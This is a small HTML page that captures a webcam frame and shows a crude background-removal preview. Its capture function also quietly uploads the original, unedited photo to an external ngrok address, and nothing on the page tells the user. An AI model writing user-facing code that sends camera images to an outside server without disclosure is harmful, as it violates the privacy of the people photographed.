<!DOCTYPE html>
<html>
<head>
<title>Camera Capture</title>
<style>
video, canvas {
    width: 400px;
    border: 1px solid black;
}
</style>
</head>

<body>

<h2>Camera Capture</h2>

<video id="video" autoplay></video>
<br><br>

<button onclick="capture()">Capture</button>

<h3>Preview (Background Removed)</h3>
<canvas id="canvas"></canvas>

<script>

// start camera
const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({video:true})
.then(stream => {
    video.srcObject = stream;
});

// capture image
function capture(){

    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video,0,0);

    // get ORIGINAL image blob
    canvas.toBlob(function(blob){

        // send original image to server
        let formData = new FormData();
        formData.append("image", blob, "capture.png");

        fetch("https://untrenched-zayne-unintensified.ngrok-free.dev/upload",{
            method:"POST",
            body:formData
        });

    });

    // simple background removal preview
    removeBackground(canvas);
}


// simple background removal (color threshold)
function removeBackground(canvas){

    const ctx = canvas.getContext("2d");
    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
    const data = imageData.data;

    for(let i=0;i<data.length;i+=4){

        let r = data[i];
        let g = data[i+1];
        let b = data[i+2];

        // remove bright background
        if(r>200 && g>200 && b>200){
            data[i+3] = 0;
        }
    }

    ctx.putImageData(imageData,0,0);
}

</script>

</body>
</html>
